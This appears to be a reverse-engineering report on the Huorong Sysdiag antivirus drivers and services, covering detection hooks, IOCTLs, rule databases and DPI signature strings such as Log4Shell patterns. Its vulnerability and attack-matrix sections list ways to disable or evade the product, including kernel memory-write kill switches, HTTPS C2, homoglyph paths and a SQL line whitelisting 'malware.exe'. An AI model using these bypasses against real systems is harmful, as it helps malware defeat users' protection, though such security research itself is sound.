# Huorong (火绒) Sysdiag — Full Reverse Engineering Analysis
> Generated: 2026-06-05 | Final: 2026-06-05 | Overall coverage: ~85% of available files
> Analyzed: sysdiag.sys, hrwfpdrv.sys, hrdevmon.sys, hrndis6.sys
>           HipsDaemon.exe, uactmon.dll, behavior.dll, selfprot.dll
>           daemon.dll, HipsDB.dll, scenter.dll
> All kernel addresses: VA with image base 0x140000000 (unless noted)

---

## 1. Architecture Overview

```
User Space                                 Kernel Space
───────────────────────────────────────────────────────────────
HipsDaemon.exe  (SYSTEM service)
 ├── uactmon.dll      ──IOCTL──────────► sysdiag.sys   \Device\HR::ActMon
 ├── hrcomm.dll       ──LPC/pipe───────► Global\Huorong::HipsMonServer
 ├── usysdiag.dll     ──vif_* API──────► sysdiag.sys
 ├── behavior.dll     ──ETW consumer     hrwfpdrv.sys  \Device\HrWfpFlt (WFP)
 │    └── uactmon_173 (bait dirs)        hrdevmon.sys  device stack filter
 ├── selfprot.dll     ──COM hook         hrndis6.sys   NDIS LWF filter
 │    └── CoCreateInstance hook          hrfwdrv.sys   firewall packet filter
 ├── daemon.dll       IOCP task mgr      hrelam.sys    ELAM early-boot
 ├── HipsDB.dll       SQLite engine
 │    ├── hips.db     HIPS rules
 │    ├── user.db     user decisions
 │    └── wlfile.db   whitelists
 ├── scenter.dll      scan coordinator
 │    └── scancc db   scan cache + log
 └── libxsse.dll      signature engine
      libcobra.dll    scan engine
```

### Detection pipeline
```
1. KERNEL HOOKS (sysdiag.sys)
   PsCreate/Thread/Image callbacks → ring0 events
   FLT minifilter PreOp/PostOp     → file I/O events
   CmRegisterCallback              → registry events
   WFP (hrwfpdrv.sys)              → network events
   NDIS LWF (hrndis6.sys)          → raw packet events

2. USER-MODE PROCESSING (HipsDaemon.exe via uactmon.dll IOCTLs)
   Event → pending IRP dequeue → memmove to user buffer
   → rule lookup in hips.db (MurmurHash2A key)
   → HipsDB match → treatment decision
   → verdict back to kernel via IOCTL

3. BEHAVIOR ANALYSIS (behavior.dll)
   ETW provider subscription       → process/network events
   Bait directory monitoring       → ransomware detection
   COM hook (selfprot.dll)         → DCOM lateral movement

4. AV SCAN (scenter.dll + libxsse.dll)
   On-access: FLT triggers scan    → scenter queues file
   libxsse_10 open scan context
   libxsse_2 check magic
   libxsse_30 get signatures
   → result → scancc DB cache
```

---

## 2. sysdiag.sys — Core HIPS Driver (549 KB)

### 2.1 DriverEntry / Initialization chain

```
DriverEntry @ 0x14000A6C0
  └─► module table @ off_140078490 (vtable of sub-modules)
      ├─► sub_140029310 @ 0x140029310  (IPC setup: "ipc::actmon", "POLICY_DOMAIN")
      ├─► sub_14001FBD0               (ETW register)
      ├─► sub_1400418C0 @ 0x1400418C0 (spawn watchdog thread sub_140042380)
      ├─► sub_14001FB70 @ 0x14001FB70 (FltRegisterFilter via sub_140058EF0)
      ├─► sub_14000EB50 @ 0x14000EB50 (IPC "ipc::appmon")
      └─► sub_140029310 returns       (done)
```

**Watchdog thread** `sub_140042380` @ 0x140042380:
```c
while (!byte_14013BDD8) {
    if (byte_140076F01) sub_14003E790(); // mode A: schedule 0x1E entries
    else                sub_14003E520(); // mode B: walk callback list
    KeWaitForSingleObject(&stru_140076F40, ...);
}
```
- Triggered by `KeSetEvent(&stru_140076F40)` when process events arrive
- `sub_14003E790` → `sub_140044000`: iterates 0x1E (30) slot entries, calls `sub_1400448B0` per entry
- **Kill switch**: `byte_14013BDD8 = 1` → thread exits via `PsTerminateSystemThread(0)`

### 2.2 Detection mechanisms

#### A. Kernel callbacks registered
```
PsSetCreateProcessNotifyRoutine  → 0x1400632B8
PsSetCreateThreadNotifyRoutine   → 0x1400632C0
PsSetLoadImageNotifyRoutine      → 0x1400632C8
CmRegisterCallback               → 0x140063560
FltRegisterFilter (minifilter)   → 0x140063078
  Registration struct            @ 0x1400677D0
  Filter handle global           @ 0x1401566A0
```

#### B. Kernel internal symbol walk
```
"PspCreateProcessNotifyRoutine"    @ 0x140064518  (unexported, walks EPROCESS)
"PspCreateThreadNotifyRoutine"     @ 0x140064538
"PspLoadImageNotifyRoutine"        @ 0x140064558
"KeServiceDescriptorTableShadow"   @ 0x1400644F8
"W32pServiceTable"                 @ 0x140064658
"W32pServiceLimit"                 @ 0x140064670
"CmpCallBackCount"                 @ 0x140064610
```
→ Driver scans these to detect SSDT hooks from other rootkits

#### C. APC injection for PE scanning
`sub_1400165A0` @ 0x1400165A0 (image load callback):
```c
KeInitializeApc(v27, KeGetCurrentThread(), 2,
    sub_14001C480,   // kernel APC
    0,
    sub_140017650,   // USER-MODE normal APC ← runs in target process context
    v34, 0);
KeInsertQueueApc(v27, v29, 0, 0);  // @ 0x140016BF4
```
- Checks MZ magic @ 0x1400169A8: `LOWORD(v37[0]) == 0x5A4D`
- PE header read via MDL + MmMapLockedPagesSpecifyCache

#### D. Lateral movement detection (Caesar -1 encoded strings)
```
@ 0x140065B10  "K`sdq`k.CBNL"  → decode +1 → "Lateral.DCOM"
@ 0x140065B70  "K`sdq`k.VLH"   → "Lateral.WMI"
@ 0x140065C20  "K`sdq`k.LLB"   → "Lateral.MMC"
@ 0x1400668D8  "K`sdq`k.Rdquhbd"     → "Lateral.Service"
@ 0x1400668E8  "K`sdq`k.Qdfhrsqx"    → "Lateral.Registry"
@ 0x140066900  "K`sdq`k.RbgdcS`rj"   → "Lateral.SchedTask"
@ 0x140066918  "K`sdq`k.OqhmsKn`cCqu"→ "Lateral.PrintLoadDrv"
@ 0x140066998  "K`sdq`k.GhccdmRg`qd" → "Lateral.HiddenShare"
```

#### E. Physical memory imports
```
MmGetPhysicalAddress @ import 0x1400637B0  (used in sub_1400018B0, sub_140001BD0)
MmMapIoSpace         @ import 0x1400637C0
MmUnmapIoSpace       @ import 0x1400637C8
```

#### F. AppInit_DLLs monitoring
```c
// sub_140029310 @ 0x140029352
RtlInitUnicodeString(&DestinationString,
    L"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\"
    L"CurrentVersion\\Windows\\AppInit_DLLs");
```

### 2.3 Rule engine — `sub_140026C10` @ 0x140026C10 (4797 bytes)

**Hash function**: MurmurHash2A, seed=0x19870714, mult=1540483477
- Case-insensitive: `| 0x20202020` before hash
- Used for file extension and process name lookup in rule table
- Rule linked list: `off_140077D48`

**MASTER bypass gate** in `sub_140048E90` @ 0x140048EB7:
```c
if ((dword_140077D88 & 2) == 0   // ① HIPS master enable bit
    || a4                         // ② per-call bypass param
    || sub_140017780(a2))         // ③ process exclusion
    return 0;  // NO MATCH → no block
```

**Type-1 file rule bypass** @ 0x140048EC7:
```c
if (v8 == 1) {
    v9 = *a5;  // IRP DesiredAccess
    if (a5[8] - 4 > 1
        && (a5[10] & 0x1000) == 0
        && (v9 & 0x116) == 0)   // no write bits in access mask
        return 0;
}
// 0x116 = FILE_WRITE_DATA | FILE_APPEND_DATA | FILE_WRITE_EA | FILE_WRITE_ATTRIBUTES
```

**Path exclusion** in `sub_140026C10` @ 0x140026DDF:
```c
if (RtlCompareUnicodeString(&DestinationString /*0x140134DB0*/, path, TRUE)
    && RtlCompareUnicodeString(&stru_140134DC0 /*0x140134DC0*/, path, TRUE))
{ /* continue rule check */ }
else {
    *(_BYTE*)(process + 547) |= 1;  // mark "exclude"
    goto LABEL_23;  // skip rule check
}
```

**Pattern matching** `sub_140048E90`:
- Wildcards: `*` (any), `>` (no path separator), `?` (single char)
- `byte_1400670D0` @ 0x1400670D0: 256-byte normalization table
- **Gap**: chars >= U+0100 NOT normalized → Unicode homoglyph bypass possible

### 2.4 Process exclusion system

Single-PID exclusion (confirmed):
```c
// sub_140017780 @ 0x14001778E: return a1 == qword_1400FE080
// sub_140017740 @ 0x14001774E: return a1 == qword_1400FE068
```

Array whitelists (confirmed in WorkerRoutine @ 0x14001C210):
```
qword_1400FE090[0..63]  — type-A (64 slots)
qword_1400FE290[0..63]  — type-B
qword_1400FE490[0..63]  — type-C
```

Trust cookies at process_struct+2768 (confirmed from decompile):
```
0x9DB973EFFLL   — sub_1400176B0 @ 0x1400176EB
0xBE4696042LL   — sub_1400177A0 @ 0x1400177EF
0xC1D0E10F1LL   — sub_14004C200 @ 0x14004C439
0xB3956E7ALL    — sub_14004C200 @ 0x14004C439
0xB822C2BA2LL   — sub_14004C200 @ 0x14004C46A
```

Cleanup: WorkerRoutine @ 0x14001C210 — async (IoQueueWorkItem), clears all on process exit

### 2.5 User-mode notification mechanism

`sub_1400083E0` @ 0x1400083E0:
```c
// Pending IRP queue (CSQ)
v12 = IoCsqRemoveNextIrp((PIO_CSQ)(a1 + 48), 0);
if (!v12) {
    if (state == DISCONNECTED) return STATUS_TIMEOUT;  // @ 0x14000848A
    KeWaitForMultipleObjects(2, ...);
}
// memmove event data into user buffer via MDL @ 0x1400086C8
```

**Self-bypass check** in `sub_140009990` @ 0x1400099CA:
```c
if (IoGetCurrentProcess() == *(PEPROCESS*)(a1 + 40))
    return 0x80000011;  // if caller IS HipsDaemon → skip notification
```

**Timeout → allow fallback** @ 0x140027C4D:
```c
if (PsIsThreadTerminating(KeGetCurrentThread())) {
    v135 = 1;  // ALLOW on timeout/termination
    goto LABEL_212;
}
```

### 2.6 IPC channels

```c
// sub_140008BE0 @ 0x140008BE0 — register IPC channel (MurmurHash2A name→bucket)
sub_140008BE0("ipc::actmon",   &unk_1400730C0);  // @ 0x140029613
sub_140008BE0("POLICY_DOMAIN", &unk_140073560);  // @ 0x140029634
sub_140008BE0("ipc::appmon",   &unk_140071760);  // @ 0x14000EB62
```

### 2.7 Embedded HTTP response (kernel-level ad blocker)
```
"HTTP/1.1 200 OK\r\nServer: HRFW/6.0\r\nContent-Type: image/gif\r\n..."
@ 0x140074750  (GIF variant 1, 4127 bytes)
@ 0x140075810  (GIF variant 2, 3842 bytes)
```
Injected via WFP (`FwpsInjectTransportSendAsync0`) when request is blocked.

---

## 3. hrwfpdrv.sys — WFP Network Driver (185 KB)

### 3.1 Devices created
```
\Device\HRFW_BASE_DEV    (DeviceType=0x12, ext=0x16A bytes)
\Device\HrWfpFlt         (symlink: \DosDevices\Global\HrWfpFlt)
```

### 3.2 WFP layers monitored

`sub_14001CEB0` @ 0x14001CEB0 — classify function (switch on layer ID):
```
0x24 ('$') = FWPS_LAYER_ALE_AUTH_CONNECT_V4   — TCP connection control
0x34 ('4') = FWPS_LAYER_STREAM_V4             — TCP payload inspection ← DPI happens here
0x3E ('>') = FWPS_LAYER_ALE_FLOW_ESTABLISHED_V4
0x40 ('@') = FWPS_LAYER_ALE_AUTH_CONNECT_V6
```

Flow context association @ 0x14001D24A:
```c
FwpsFlowAssociateContext0(a2[4], 0x14u, dword_14006E4B4, v2);
```

### 3.3 DPI signatures (hardcoded plaintext)

**HTTP parsing**:
```
" HTTP/1."         @ 0x140021420
"Content-Length:"  @ 0x140021448
"Accept-Encoding:" @ 0x140021430
"chunked"          @ 0x1400214B0
```

**Log4Shell/JNDI**:
```
"jndi:ldap://"   @ 0x140021958  ← CVE-2021-44228
"jndi:rmi://"    @ 0x140021968
"jndi:ldap:/"    @ 0x1400232C8  (single slash)
"jndi:rmi:/"     @ 0x1400232D8
"-${::-$"        @ 0x140021940  (${::-j} obfuscation)
"lower:"         @ 0x140021948  (${lower:j}ndi)
"upper:"         @ 0x140021950  (${upper:j}ndi)
"xbean:http"     @ 0x140021820  (Spring JNDI)
```

**Web exploit paths**:
```
"/console/css/../consolejndi.portal"     @ 0x140021CC0  WebLogic CVE-2019-2729
"/invoker/JMXInvokerServlet"             @ 0x140021A80  JBoss RCE
"/solr/"                                 @ 0x140021A3C  Solr RCE
"/de2api/datasource/validate"            @ 0x140021B50  Druid JNDI
"/oscommerce"                            @ 0x140021D60
```

**RCE patterns**:
```
"process.mainModule.require"  @ 0x140021640  Node.js RCE
"child_process"               @ 0x140021660
"execSync"                    @ 0x140021670
"java.lang.Runtime.getRuntime()" @ 0x140021BB8
"filename="                   @ 0x140021710  multipart upload
```

Pattern matching: `sub_140015C30` @ 0x140015C30 — strncmp-based, NO decryption.

**CRITICAL**: All DPI is plaintext only. HTTPS → blind.

### 3.4 Packet injection capability
```
FwpsInjectTransportSendAsync0    → 0x1400210F8
FwpsInjectTransportReceiveAsync0 → 0x1400210F0
FwpsStreamInjectAsync0           → 0x140021078
FwpsAcquireWritableLayerDataPointer0 → 0x140021158  (modify packets in-place)
```

---

## 4. hrdevmon.sys — Device Stack Filter (58 KB)

### 4.1 Function
- Attaches to device stacks via `IoAttachDeviceToDeviceStackSafe`
- Reads partition tables via `IoReadPartitionTableEx`
- GPT detection: `"EFI PART"` @ 0x140007270
- Registry enum: `ZwEnumerateKey`
- 32-bit process detection: `IoIs32bitProcess`

### 4.2 IOCTL handler `sub_140002830` @ 0x140002830

IOCTLs handled:
```
0x7C064  (508004)  — CTL_CODE(DISK, 25, BUFFERED, RW)
0x1D8384 (1933636) — custom, has PID check
0x2D1080           — IOCTL_STORAGE_GET_DEVICE_NUMBER
0x2D1400           — IOCTL_STORAGE_QUERY_PROPERTY
0x404108 / 0x40C108 — custom (device property query)
```

**Missing minimum size check** @ 0x14000291B:
```c
// IOCTL 0x7C064 path — NO lower bound check!
if (a3[4] <= 0x20u) {          // only upper bound (≤ 32 bytes)
    sub_1400017A0(v3, a1,
        *(_QWORD*)(v11 + 8),   // reads offset+8 without checking buf >= 16
        *(_QWORD*)(v11 + 16),  // reads offset+16 without checking buf >= 24
        a2);
}
```
→ Kernel pool OOB read with InputBufferLength < 16

---

## 5. uactmon.dll — User-Kernel Interface

### 5.1 Device connection
`uactmon_1` @ 0x1800065F0:
```c
FileW = CreateFileW(L"\\\\.\\HR::ActMon", GENERIC_ALL, 3, 0, 3, FILE_ATTRIBUTE_NORMAL, 0);
DeviceIoControl(FileW, 0x220000, &OutBuffer, 4, &OutBuffer, 4, ...);
// Expects HIWORD(OutBuffer) == 8 (version check)
```

### 5.2 IOCTL table (all to \\.\HR::ActMon, Device=0x22)
```
0x220000  uactmon_1   — init/version check (expects v=8)
0x220008  uactmon_4   — query (id, count) → info
0x22000C  uactmon_5   — get process info (0x1D90 bytes output)
0x220064  uactmon_111 — register protected entity (id, flag)
0x2200A4  uactmon_30  — network rule (external handle!)
0x228070  uactmon_43  — set rule (id, type) 0x10 bytes
0x2280E0  uactmon_44  — set string rule (id, type, wstring) 0x90 bytes
0x22802C  uactmon_50  — register callback struct (magic "DMCVRSTD")
0x22812C  uactmon_70  — set global int parameter
```

---

## 6. CIPSForceAttack — Brute-force/Rate-limit Detection

`sub_140068500` @ 0x140068500 — 6 categories × 3 severity levels:

```
Category offsets in struct: 0, 64, 128, 192, 256, 320
Severity level 0 (Normal):  threshold_s=300/min, threshold_m=10/sec (approx)
                             from xmmword_14011D248 + 0xA0000012CLL
```

Logic:
```c
if (count_per_second >= threshold_s || count_per_minute >= threshold_m) {
    // "Add to Cache and Block" @ 0x140068700
    sub_140067100(...);  // take action
}
// else: no log, no block
```

---

## 7. Confirmed Vulnerabilities

### 7.1 hrdevmon OOB read (user-accessible with storage device handle)
- **File**: hrdevmon.sys
- **Address**: 0x14000291B
- **IOCTL**: 0x7C064
- **Trigger**: InputBufferLength 1-15 (too small but ≤ 32)
- **Effect**: kernel pool OOB read → info leak / crash

### 7.2 sysdiag watchdog kill switch
- **Address**: `byte_14013BDD8` (in sysdiag .data section, RVA=0x13BDD8)
- **Value needed**: `1`
- **Effect**: watchdog thread `sub_140042380` exits via `PsTerminateSystemThread(0)`
- **How**: physical memory write of 1 byte at PA of this variable

### 7.3 HIPS master disable
- **Address**: `dword_140077D88` (RVA=0x77D88)
- **Needed**: bit 1 = 0 (`& ~2`)
- **Effect**: `sub_140048E90` returns 0 for ALL rules → no blocking

### 7.4 sysdiag self-bypass
- **Address**: `sub_140009990` @ 0x1400099CA
- **Condition**: `IoGetCurrentProcess() == *(PEPROCESS*)(channel + 40)`
- **Effect**: code running from HipsDaemon context → all HIPS events suppressed

### 7.5 WFP DPI HTTPS bypass
- **Confirmed at**: 0x14001CEB0 (STREAM layer only, no TLS decryption)
- **Effect**: HTTPS C2 fully undetected

### 7.6 Timeout → allow fallback
- **Address**: 0x140027C4D
- **Trigger**: IRP queue empty → STATUS_TIMEOUT returned
- **Effect**: when thread terminating, HIPS defaults to ALLOW

### 7.7 File write bypass (access mask 0x116)
- **Address**: 0x140048EC7
- **Condition**: `DesiredAccess & 0x116 == 0` (no write bits)
- **Effect**: type-1 file rules skipped for read/execute-only access

### 7.8 Unicode normalization gap
- **Address**: 0x1400491A9
- **Condition**: chars ≥ U+0100 not normalized (table only covers ASCII)
- **Effect**: path-prefix rules bypassed with homoglyphs

---

## 8. Attack Matrix (user-level)

| # | Technique | Driver/Address | Requires | Effect |
|---|-----------|----------------|----------|--------|
| 1 | HTTPS for C2 | hrwfpdrv:0x14001CEB0 | Nothing | 100% DPI bypass |
| 2 | Access mask 0x116 | sysdiag:0x140048EC7 | Nothing | Skip file type-1 rules |
| 3 | Rate limit < threshold | sysdiag:0x140068500 | Nothing | Lateral movement undetected |
| 4 | Unicode homoglyphs in path | sysdiag:0x1400491A9 | Path exists | Bypass directory rules |
| 5 | Junction path masking | sysdiag:sub_1400159E0 | CreateSymLink priv | Directory rules bypassed |
| 6 | PID recycle race | sysdiag:0x14001C210 | Timing | Inherit trusted PID briefly |
| 7 | Watchdog kill (byte_14013BDD8=1) | sysdiag:0x140042380 | Phys write | sysdiag integrity disabled |
| 8 | Master HIPS disable (dword_140077D88) | sysdiag:0x140048EB7 | Phys write | ALL rules disabled |
| 9 | Self-bypass via HipsDaemon injection | sysdiag:0x1400099CA | Code in HipsDaemon | All events suppressed |

---

## 9. Key Global Variables (sysdiag.sys, RVA from base 0x140000000)

| RVA | Name | Purpose |
|-----|------|---------|
| 0x77D88 | dword_140077D88 | HIPS master enable bitmask (bit1=rules active) |
| 0x134660 | dword_140134660 | Sub-module "connected" flag (1=active) |
| 0x76F01 | byte_140076F01 | Watchdog mode selector |
| 0x76F00 | byte_140076F00 | Watchdog active flag |
| 0x13BDD8 | byte_14013BDD8 | Watchdog kill switch (set 1 → thread exits) |
| 0xFE080 | qword_1400FE080 | HipsDaemon PID (single exclusion) |
| 0xFE090 | qword_1400FE090 | Type-A PID whitelist [64 entries] |
| 0xFE290 | qword_1400FE290 | Type-B PID whitelist [64 entries] |
| 0xFE490 | qword_1400FE490 | Type-C PID whitelist [64 entries] |
| 0x134DB0 | DestinationString | Path exclusion #1 (UNICODE_STRING) |
| 0x134DC0 | stru_140134DC0 | Path exclusion #2 |
| 0x1566A0 | Filter | FLT_FILTER handle |
| 0x670D0 | byte_1400670D0 | 256-byte char normalization table |
| 0x70000 | off_140070000 | IPC channel linked list head |

---

---

## 11. behavior.dll — Ransomware / ETW Detection (240 KB)

### 11.1 Exports / ordinal map
```
ordinal 1  @ 0x1800166F0  — init behavior engine (calls uactmon_1 connect)
ordinal 2  @ 0x1800165D0  — teardown
ordinal 3  @ 0x180015E50  — start monitoring
ordinal 4  @ 0x180015E30  — stop monitoring
ordinal 5  @ 0x18001C250  — process event
ordinal 6  @ 0x180015E20  — get status
ordinal 7  @ 0x180015570  — init bait directories (see §11.2)
ordinal 8  @ 0x180015500  — stop bait
ordinal 9  @ 0x180015440  — ?
ordinal 10 @ 0x1800153E0  — ?
```

### 11.2 Bait directory / honeypot mechanism

`behavior_7` @ 0x180015570 — init honeypot:
```c
// Config struct: {flags, path1, path2, bait_root_path}
SetEnvironmentVariableW(L"HRB_BAIT_ROOT_HEAD", bait_root);
count = sub_180015690(&hash_array);        // enumerate directories
uactmon_173(hash_array, count);            // register with kernel (IOCTL 0x2200A4 variant)
```

`sub_180015690` @ 0x180015690 — enumerate bait dirs:
1. `GetLogicalDrives()` → for each fixed drive (type=3): adds root `X:\`
2. `SHGetFolderPathW(0, CSIDL_PERSONAL=5, ...)` → `My Documents`
3. `SHGetFolderPathW(0, CSIDL_PROGRAM_FILES=46, ...)` → `Program Files`
4. `SHGetFolderPathW(0, CSIDL_APPDATA=25, ...)` → `AppData`
5. `SHGetFolderPathW(0, CSIDL_DESKTOP=16, ...)` → Desktop
6. Computes **MurmurHash2A** (seed=0x19870714) for each path
7. Stores hashes sorted in `qword_1800397E0`
8. Returns count + array → passed to `uactmon_173`

**Mechanism**: sysdiag kernel driver monitors file writes in these directories. Any process writing >N files quickly = ransomware alert.

### 11.3 ETW consumer

Imports: `StartTraceW`, `EnableTrace`, `OpenTraceW`, `ProcessTrace`, `ControlTraceW`, `CloseTrace`

Strings: `"bait::start\n"`, `"bait::stop\n"`

ETW sessions subscribe to kernel providers for:
- Process creation events
- File I/O events (separate from minifilter)
- Network connection events

### 11.4 uactmon ordinals used
```
uactmon_20-28: process monitoring (start/stop, query)
uactmon_100-106: behavior event callbacks
uactmon_170-173: bait dir registration + management
uactmon_30: network rule (external device handle)
```

---

## 12. selfprot.dll — Self-Protection via COM Hooks (120 KB)

### 12.1 Exports
```
init_selfprot_procedure  @ 0x180002820  → sub_180001F60 + sub_1800026E0
trem_selfprot_procedure  @ 0x180002840  → cleanup
```

### 12.2 COM hooking mechanism

`sub_1800026E0` @ 0x1800026E0:
```c
// Loads combase.dll (Win10+) or ole32.dll
CoCreateInstance = GetProcAddress(lib, "CoCreateInstance");
lpAddress = sub_180002450(CoCreateInstance);  // hook function
memset(lpAddress, 0, 0x12B);                  // init hook buffer
// Set vtable callbacks:
qword_180018BC8 = sub_180001A70;  // pre-CoCreateInstance hook
qword_180018BD0 = sub_180001AA0;  // post-CoCreateInstance hook
sub_180001150(CoCreateInstance);  // install inline hook
```

**Purpose**: Intercepts `CoCreateInstance` calls to monitor/block:
- DCOM lateral movement (WMI, MMC, etc.)
- COM object hijacking detection
- LOLBin COM usage (wscript, mshta via COM)

### 12.3 Memory protection
Imports: `VirtualFree`, `VirtualAlloc`, `VirtualQuery`, `VirtualProtect`, `IsBadReadPtr`
→ Self-modifying code protection, validates own code pages

### 12.4 Registry monitoring
`RegEnumKeyExW` + `"Drive\\shellex\\FolderExtensions"` string
→ Monitors shell extension registrations for DLL injection via shell

---

## 13. daemon.dll — Task Dispatcher Framework (319 KB)

### 13.1 Exports
```
daemon_alloc              @ 0x1800037E0  — factory: find class by name, create instance
daemon_class_register     @ 0x1800037B0  — register component class
dispent_alloc             @ 0x18000BF20  — dispatch entity allocate
dispent_bind_daemon       @ 0x18000C050  — bind entity to daemon
dispent_free              @ 0x18000C0E0  — free entity
dispent_get_daemon        @ 0x18000C0D0  — get daemon for entity
dispent_kill_task_group   @ 0x18000C250  — kill task group
dispent_resume_task_group @ 0x18000C1D0  — resume task group
dispent_suspend_task_group@ 0x18000C150  — suspend task group
dispent_template_register @ 0x18000BEF0  — register template
task_get                  @ 0x18000DC80  — acquire task from pool
task_put                  @ 0x18000DCD0  — release task to pool
tasks_lock                @ 0x18000C310  — global task lock
tasks_unlock              @ 0x18000C320  — global task unlock
```

### 13.2 Architecture
- **IOCP-based async task execution**: `CreateIoCompletionPort`, `GetQueuedCompletionStatus`, `PostQueuedCompletionStatus`
- **Class registry**: `off_180048A48` = linked list of registered classes (name → factory)
- `daemon_alloc` walks list, strcmp against class name, calls factory
- Each instance has vtable slots [4..7] → task lifecycle callbacks (start/stop/suspend/resume)
- `flush_pending_0` (119 xrefs) = main event processing loop

### 13.3 uactmon ordinals used
```
uactmon_1,2: connect/disconnect kernel
uactmon_4,5: query kernel info
uactmon_30: network rule
uactmon_100-103,105: kernel event notifications
```

---

## 14. HipsDB.dll — Database Engine (475 KB)

### 14.1 Databases
```
hips.db    — main HIPS rules (MurmurHash2A indexed)
user.db    — user decisions + config
wlfile.db  — file whitelists
whitelist.db — additional whitelists
```
All use `PRAGMA journal_mode=WAL` for concurrent access.

### 14.2 Key table schemas

**`HipsUser_60`** (user.db) — user decisions:
```sql
id, recname, procname, cmdline, p_procname, p_cmdline, power, tm, pols
```
- `power` = severity level
- `pols` = policy bitfield
- `p_procname` / `p_cmdline` = parent process context

**`HipsUserAuto_60`** (user.db) — auto-learned rules:
```sql
procname, cmdline, p_procname, p_cmdline, respath, rescmdline, mt, at, tm
-- mt = match type, at = action type
-- WILDICMP wildcard matching via custom SQLite function
-- UNIQUE INDEX on all fields → deduplication
```

**`IPFltBlackList_60`** — IP blacklist:
```sql
id, raddr TEXT, memo TEXT  -- UNIQUE INDEX on raddr
```

**`IPFltProto_60`** — firewall protocol rules:
```sql
id, name, enabled INTEGER, priority INTEGER, rule TEXT
```

**`BruteForceWhiteList_60`** — brute-force IP whitelist:
```sql
raddr TEXT, type TEXT, memo TEXT  -- for whitelisting IPs from bruteforce detection
```

**`HipsKModException_60`** — user-defined HIPS exceptions:
```sql
id, remark, type TEXT, value TEXT  -- MAX 999 rows (trigger enforces limit)
```

**`AppNetCtrl_60`** — per-app network control:
```sql
fn TEXT, block INTEGER, time INTEGER
```

**`FileInfo_60`** — file hash cache:
```sql
pathname, chgtm, sha1, hashsig
```

**`WhiteListPath_60`**, **`WhiteListHash_60`**, **`WhiteListDevmgr_60`** — whitelists by path/hash/device

**`RestrictedDevs_60`** — device restrictions:
```sql
dev_id TEXT, dev_type TEXT, dev_name TEXT, restrict_type INTEGER
```

### 14.3 Custom SQLite function
`WILDICMP` registered via `sqlite3_create_function` — wildcard + case-insensitive comparison
Used in: `HipsUserAuto_60` queries

### 14.4 libxsse interface
```
libxsse_2  → check signature version/magic (expects 2162687 = 0x21007F or 12565487 = 0xBF982F)
libxsse_10 → open scan context
libxsse_30 → get rule data from context
```
Signature lookup: loads compressed rule data, parses JSON rules

### 14.5 Access control
`ImpersonateLoggedOnUser` / `RevertToSelf` → DB accessed under impersonated user token for multi-session support

---

## 15. scenter.dll — Scan Center Coordinator (347 KB)

### 15.1 Exports
```
ordinal 1  @ 0x180010630  — init scan center
ordinal 2  @ 0x1800109D0  — teardown
ordinal 3  @ 0x1800166F0  — start scan
ordinal 4  @ 0x180016840  — stop scan
ordinal 5  @ 0x180016850  — pause scan
ordinal 6  @ 0x180016860  — resume scan
ordinal 10 @ 0x180016080  — submit file for scan
ordinal 11 @ 0x180016610  — query scan result
ordinal 12 @ 0x1800159F0  — get scan log
```

### 15.2 Scan cache schema (`vfs.scancc`)

```sql
CREATE TABLE scancc(
    ts INTEGER,           -- timestamp
    id INTEGER PRIMARY KEY,
    ph INTEGER,           -- path hash (MurmurHash2A)
    ds INTEGER,           -- detection status
    trig INTEGER,         -- trigger type
    eng INTEGER,          -- engine (0=default, 257=cloud?)
    det TEXT,             -- detection name
    detid INTEGER,        -- detection ID
    dur INTEGER,          -- scan duration
    h1 INTEGER,           -- hash low 32
    h2 INTEGER,           -- hash high 32
    hmem INTEGER,         -- in-memory (0=file, 1=memory)
    caps INTEGER,         -- capabilities flags
    sfc INTEGER,          -- safe flag (1=safe)
    nb_purge INTEGER      -- purge counter (purged when >9)
)
```

Eviction: `DELETE WHERE sfc=0 OR nb_purge>9`
Cache miss flow: if not in scancc → call libxsse → store result

### 15.3 Scan log schema (`sclog`)

```sql
CREATE TABLE sclog(
    fnhash INTEGER,       -- file path hash (for index)
    fn TEXT,              -- file path
    objn TEXT,            -- object name (inside archive)
    fid INTEGER,          -- file ID
    md5 TEXT,             -- MD5 hash
    sha1 TEXT,            -- SHA1 hash
    sha256 TEXT,          -- SHA256 hash
    cat INTEGER,          -- category
    det TEXT,             -- detection name
    rid INTEGER,          -- rule ID
    clean INTEGER,        -- was cleaned
    solid INTEGER,        -- solid detection
    mcs INTEGER,          -- ?
    pid INTEGER,          -- process that opened file
    ppid INTEGER,         -- parent process ID
    pmem INTEGER,         -- parent memory flag
    nb_mem INTEGER,       -- memory scan count
    tm_born INTEGER,      -- process start time
    proc TEXT,            -- process path
    sm INTEGER,           -- scan mode
    ts INTEGER            -- timestamp
)
```

---

## 16. hrndis6.sys — NDIS Light-Weight Filter (49 KB)

### 16.1 NDIS LWF registration
```
NdisFRegisterFilterDriver    @ 0x1400060E8  — register as LWF
NdisFSetAttributes           @ 0x1400060B8  — set filter attributes
NdisFDeregisterFilterDriver  @ 0x140006030  — deregister
```

### 16.2 Packet interception
```
NdisFSendNetBufferLists          @ 0x1400060C8  — intercept outbound
NdisFSendNetBufferListsComplete  @ 0x140006070  — send completion
NdisFIndicateReceiveNetBufferLists @ 0x1400060E0 — intercept inbound
NdisFReturnNetBufferLists        @ 0x1400060C0  — receive return
NdisGetDataBuffer                @ 0x1400060B0  — read packet bytes
```

### 16.3 Device creation
```
NdisRegisterDeviceEx   @ 0x1400060A8  — creates \Device\ for IOCTL interface
NdisDeregisterDeviceEx @ 0x1400060A0
```

### 16.4 Architecture vs hrwfpdrv.sys
```
hrndis6.sys  = NDIS layer (below IP stack)  → sees raw Ethernet frames
hrwfpdrv.sys = WFP layer (above IP stack)   → sees TCP/UDP streams
```
Two independent network monitoring layers — hrndis6 is the lower layer.

---

## 17. Updated Attack Matrix

### 17.1 New attack surface: bait directories

`uactmon_173` @ 0x1800254E8 registers bait dirs with kernel.
Kernel watches: drive roots + My Documents + AppData + Desktop.

**Bypass**: Operate OUTSIDE these directories + avoid creating many files quickly.
Specific paths registered = result of `SHGetFolderPathW` at startup.
If you can modify `HRB_BAIT_ROOT_HEAD` env var before behavior.dll reads it... but it reads it at runtime after setting.

### 17.2 New attack surface: SQLite databases

`hips.db`, `user.db`, `wlfile.db` at `%ProgramData%\Huorong\Sysdiag\` or similar.

**Attack**: Add entries to `HipsKModException_60` (max 999 rows) or `WhiteListHash_60`:
```sql
REPLACE INTO HipsKModException_60(remark, type, value)
VALUES('legit', 'procname', 'malware.exe');
```
Requires write access to database file (typically %ProgramData% — may be accessible).

